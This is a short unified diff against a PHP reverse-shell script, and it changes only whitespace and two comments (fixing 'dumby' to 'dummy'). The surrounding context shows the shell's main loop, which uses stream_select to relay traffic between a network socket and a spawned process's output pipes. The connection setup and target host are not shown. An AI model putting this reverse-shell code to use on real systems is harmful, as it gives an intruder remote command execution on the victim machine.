@@ -56,7 +56,7 @@
     stream_set_blocking($pipes[1], FALSE);
     stream_set_blocking($pipes[2], FALSE);
 
-    
+
     // now we've got a reverse shell.
     // handle io:
     while (TRUE) 
@@ -71,9 +71,9 @@
             break;
         }
 
-        // keeps track of the state of stdin, stdout, and stderr
+        // keeps track of the state of incoming data, stdout, and stderr
         $traffic = array($socket, $pipes[1], $pipes[2]);
-        // dumby variables because we only care about traffic
+        // dummy variables because we only care about traffic
         $write = null; $except = null;
         // wait for traffic
         $changedStreams = stream_select($traffic,$write,$except,null);
